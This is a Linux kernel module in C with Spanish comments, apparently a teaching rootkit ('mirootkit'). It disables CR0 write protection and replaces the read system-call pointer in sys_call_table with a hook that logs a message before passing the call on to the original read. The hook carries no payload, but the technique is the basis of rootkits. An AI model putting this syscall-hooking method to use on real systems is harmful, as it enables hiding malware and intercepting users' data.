#include <linux/init.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/slab.h>
#include <linux/kern_levels.h>
#include <linux/gfp.h>
#include <asm/unistd.h>
#include <asm/paravirt.h>
#include <linux/kernel.h>

/* Cuando se llama a la IDT (interrupt-descriptor table) se llama al manipulador de las
llamadas al sistema, que lleva a la tabla de llamadas al sistema, en este caso la llamada de lectura sys_read(), 
a través de su puntero le llevaria a la funcion read, pero nosotros modificaremos el puntero para que vaya
a nuestra funcion modificada read donde ejecutara lo que hayamos implementado y despues acudira a la verdadera funcion 
read */


MODULE_LICENSE("GPL");
MODULE_AUTHOR("Elias");
MODULE_DESCRIPTION("Enganche (hook) de la llamada al sistema read");
MODULE_VERSION("1.0");

unsigned long **SYS_CALL_TABLE; // puntero que apunta a la tabla de llamadas al sistema




void EnablePageWriting(void){
	write_cr0(read_cr0() & (~0x10000));

} 
void DisablePageWriting(void){
	write_cr0(read_cr0() | 0x10000);

} 
// estas dos funciones se encargan de inhabilitar un segmento del flujo del procesador
// en el que se encuentra una caracteristica de seguridad dentro de las paginas de 
// memoria que impide que se escriba en ellas y lo vuelven a habilitar cuando hayamos acabado

asmlinkage int (*original_read)(unsigned int, void __user*, size_t);
asmlinkage int  HookRead(unsigned int fd, void __user* buf, size_t count) {
    printk(KERN_INFO "---READ ENGANCHADO AQUI ---");
    return (*original_read)(fd, buf, count); //Se ejecuta nuestra funcion y despues vuelve a la funcion read original
}



static int __init SetHooks(void) {
    // Conseguimos el puntero de la tabla de llamadas al sistema = Syscall Table 
    // SYS_CALL_TABLE = (unsigned long**)kallsyms_lookup_name("sys_call_table");
    SYS_CALL_TABLE = (unsigned long**)__symbol_get("sys_call_table");

    printk(KERN_INFO "Los ganchos estaran listos. \n");
    printk(KERN_INFO "System call table en %p\n", SYS_CALL_TABLE);

    EnablePageWriting(); // esto nos permitira hacer los cambios que necesitemos a la syscall 
    // Reemplaza el Puntero de la Syscall_read en nuestra sys_call
    original_read = (void*)SYS_CALL_TABLE[__NR_read];
    SYS_CALL_TABLE[__NR_read] = (unsigned long*)HookRead;
    DisablePageWriting(); // vuelve a ser segura

    return 0; 

}
        
    
    // Cuando descarguemos (desactivemos) nuestro modulo, es decir, el driver, volveremos a dejar la tabla de sys_calls como estaba
static void __exit HookCleanup(void) {
    EnablePageWriting();
    SYS_CALL_TABLE[__NR_read] = (unsigned long*)original_read; // de vuelta a la llamada original
    DisablePageWriting();

    printk(KERN_INFO "Ganchos limpios!");

}

module_init(SetHooks);
module_exit(HookCleanup);


//sudo insmod mirootkit.ko
//dmesg para ver los mensajes